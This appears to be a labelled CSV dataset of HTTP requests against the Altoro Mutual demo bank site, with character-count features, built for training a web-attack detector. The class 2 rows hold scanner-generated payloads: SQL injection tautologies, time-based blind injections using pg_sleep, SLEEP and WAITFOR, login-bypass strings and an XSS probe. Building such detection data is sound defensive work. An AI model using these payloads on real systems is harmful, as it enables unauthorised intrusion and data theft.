method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/punycode,,0,0,0,0,0,0,1
GET,/feedback.jsp,,0,0,0,0,0,0,1
GET,/v2,,0,0,0,0,0,0,1
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,1
GET,/search.jsp,,0,0,0,0,0,0,1
GET,/v2/swagger.json,,0,0,0,0,0,0,1
GET,/react,,0,0,0,0,0,0,1
GET,/doSubscribe,,0,0,0,0,0,0,1
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,1
GET,/licenses/mit-license.php,,0,0,0,0,0,0,1
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,1
GET,/1998,,0,0,0,0,0,0,1
GET,/pr,,0,0,0,0,0,0,1
GET,/index.jsp,,0,0,0,0,0,0,1
GET,/swagger/properties.json,,0,0,0,0,0,0,1
GET,/jonschlinkert,,0,0,0,0,0,0,1
GET,/altoro/images/gradient.jpg,,0,0,0,0,0,0,1
GET,/Starcounter-Jack,,0,0,0,0,0,0,1
GET,/use-check-prop-types,,0,0,0,0,0,0,1
GET,/validator,,0,0,0,0,0,0,1
GET,/1998/Math/MathML,,0,0,0,0,0,0,1
GET,/classnames,,0,0,0,0,0,0,1
GET,/XML/1998,,0,0,0,0,0,0,1
GET,/1999/xlink,,0,0,0,0,0,0,1
GET,/react/docs,,0,0,0,0,0,0,1
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,1
GET,/search.jsp?query=1,,0,0,0,0,0,0,1
GET,/util/,,0,0,0,0,0,0,1
GET,/my%20documents,,0,0,0,0,1,0,1
GET,/default.jsp,,0,0,0,0,0,0,1
GET,/XML,,0,0,0,0,0,0,1
GET,/doLogin,,0,0,0,0,0,0,1
GET,/inside_points_of_interest.htm,,0,0,0,0,0,0,1
GET,/images,,0,0,0,0,0,0,1
GET,/robots.txt,,0,0,0,0,0,0,1
GET,/Starcounter-Jack/JSON-Patch,,0,0,0,0,0,0,1
GET,/util,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Findex.html%23%2F1._Login%2Fproperties.json,,0,0,0,0,0,0,1
GET,/2000,,0,0,0,0,0,0,1
GET,/altoro,,0,0,0,0,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents,,0,0,0,0,3,0,1
GET,/gregjacobs,,0,0,0,0,0,0,1
GET,/react/docs/error-decoder.html?invariant=,,0,0,0,0,0,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/login.jsp,,0,0,0,0,0,0,1
GET,/gregjacobs/Autolinker.js,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
GET,/swagger/index.html,,0,0,0,0,0,0,1
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=glvysyjs&subject=1,0,0,0,0,0,0,1
GET,/2000/svg,,0,0,0,0,0,0,1
GET,/licenses,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
GET,/cgi-bin/le_check_v3.exe,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,1
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,1
GET,/1999/xhtml,,0,0,0,0,0,0,1
GET,/swagger,,0,0,0,0,0,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,1
GET,/sitemap.xml,,0,0,0,0,0,0,1
GET,/sitemap.xml.gz,,0,0,0,0,0,0,1
GET,/1999,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,1
GET,/XML/1998/namespace,,0,0,0,0,0,0,1
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,1
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,1
GET,/Xq22NIvq,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Findex.html%23%2Fproperties.json,,0,0,0,0,0,0,1
GET,/survey_questions.jsp,,0,0,0,0,0,0,1
GET,/status_check.jsp,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Fproperties.json,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Findex.html%23%2Fjavascript%3AdomxssExecutionSink(1%2C%22'%5C%22%3E%3Cxsstag%3E()hashxss%22)%2Fproperties.json,,1,3,0,2,0,0,1
GET,/1998/Math,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,1
GET,/retirement.htm,,0,0,0,0,0,0,1
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,1
GET,/high_yield_investments.htm,,0,0,0,0,0,0,1
GET,/IKdLGmOC,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,1
GET,/sendFeedback,,0,0,0,0,0,0,1
GET,/security.htm,,0,0,0,0,0,0,1
GET,/images/,,0,0,0,0,0,0,1
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,1
GET,/oauth2-redirect.html,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,1
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,1
GET,/altoro/images,,0,0,0,0,0,0,1
GET,/subscribe.jsp,,0,0,0,0,0,0,1
GET,/acunetix-wvs-test-for-some-inexistent-file,,0,0,0,0,0,0,1
GET,/my%20documents/JohnSmith,,0,0,0,0,1,0,1
GET,/Orcl1bAn,,0,0,0,0,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,,0,0,0,0,3,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/swagger/,,0,0,0,0,0,0,1
GET,/pr/,,0,0,0,0,0,0,1
GET,/jonschlinkert/repeat-string,,0,0,0,0,0,0,1
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,1
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=JyI=,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%bf'%bf""",1,1,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=rfgRYQo8,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0""XOR(if(now()=sysdate()%2csleep(10)%2c0))XOR""Z&subject=1",0,2,0,5,0,1,2
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b219-219-1=0%2b0%2b0%2b1%20or%20'AYK2X5ky'=',,4,0,0,0,4,0,2
POST,/doLogin,btnSubmit=Login&passw=%40%40MxpPe&uid=1,0,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b730-730-1=0%2b0%2b0%2b1%20or%20'2AZPYuil'=',4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%5c,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b869-869)&name=tmtqptlo&subject=1,0,0,0,1,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z&name=tmtqptlo&subject=1,2,0,0,5,0,1,2
GET,/search.jsp?query=-1%20OR%202%2b698-698-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=o3Qg54Np');select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=1%00%c0%a7%c0%a2%252527%252522&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/index.jsp?content=%40%40IIgrS,,0,0,0,0,0,0,2
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,2,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1'%20OR%202%2b803-803-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,0,0,2
GET,/search.jsp?query=%5c,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=4AQV32E1';select%20pg_sleep(3);%20--%20,1,0,1,1,0,3,2
POST,/sendFeedback,submit=Submit&cfile=1acuWCufqYELQC&comments=1&email_addr=sample%40email.tst&name=hrcbkxgn&subject=1,0,0,0,0,0,0,2
GET,/index.jsp?content=-1%20OR%203%2b906-906-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/doLogin,btnSubmit=Login&passw=JyI=&uid=1,0,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf""&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=SmSMPqQp');select%20pg_sleep(15);%20--%20&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2csleep(5)%2c0)&subject=1,0,0,0,4,0,1,2
GET,/search.jsp?query=JfBlKlIX';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
GET,/survey_questions.jsp?step=-1%20OR%203%2b11-11-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1acuXRyiXu1UhX&name=hrcbkxgn&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8=6*8%20AND%20'63VZ'!='63VZ%25&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/survey_questions.jsp?step=b%25'%20AND%202*3*8=6*8%20AND%20'i982'!='i982%25,,4,0,0,0,4,0,2
GET,/search.jsp?query=-1;%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=hORfg1tv&subject=1,0,0,0,0,0,0,2
GET,/search.jsp,,0,0,0,0,0,0,2
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=yLci0Exd'));select%20pg_sleep(3);%20--%20&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
